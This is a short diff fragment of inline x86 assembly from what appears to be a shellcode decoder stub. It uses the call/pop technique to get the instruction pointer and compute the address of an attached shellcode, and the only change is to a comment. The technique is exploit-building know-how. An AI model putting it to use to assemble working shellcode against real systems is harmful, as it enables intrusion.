@@ -10,7 +10,7 @@ __asm
 	        call myEIP 
 myEIP : 
 	        pop edx  //get EIP 
-                add edx , 0x26  //  (decoder)EIP + addr of shellcode  
+                add edx , 0x26  //  (decoder)EIP +  sizeof(decoder) = addr of shellcode :p  
 		xor eax , eax 
 		xor ecx , ecx 
 		
